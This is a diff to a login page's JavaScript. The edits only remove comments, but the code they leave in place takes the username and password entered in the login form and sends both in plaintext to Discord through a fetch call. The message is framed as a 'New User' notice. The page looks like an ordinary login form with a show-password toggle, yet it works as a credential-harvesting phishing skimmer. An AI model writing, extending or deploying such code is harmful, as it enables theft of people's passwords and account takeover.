@@ -3,16 +3,15 @@ document.getElementById('togglePassword').addEventListener('click', function () 
     const type = passwordInput.type === 'password' ? 'text' : 'password';
     passwordInput.type = type;
 
-    // Toggle the emoji to indicate whether the password is visible or hidden
     if (type === 'password') {
-        this.textContent = '👁️'; // Eye symbol when password is hidden
+        this.textContent = '👁️';
     } else {
-        this.textContent = '🙈'; // Eye with a line symbol when password is visible
+        this.textContent = '🙈';
     }
 });
 
 document.getElementById('loginForm').addEventListener('submit', function (event) {
-    event.preventDefault(); // Prevent the default form submission
+    event.preventDefault();
 
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
@@ -24,7 +23,7 @@ document.getElementById('loginForm').addEventListener('submit', function (event)
             {
                 title: "New User",
                 description: `User: **${username}** has been created with the password: **${password}**`,
-                color: 0x808080 // grey color
+                color: 0x808080
             }
         ]
     };
@@ -36,6 +35,6 @@ document.getElementById('loginForm').addEventListener('submit', function (event)
         },
         body: JSON.stringify(embedPayload)
     }).catch(error => {
-        console.error('Error sending to Discord:', error); // Log errors to the console
+        console.error('Error sending to Discord:', error);
     });
 });
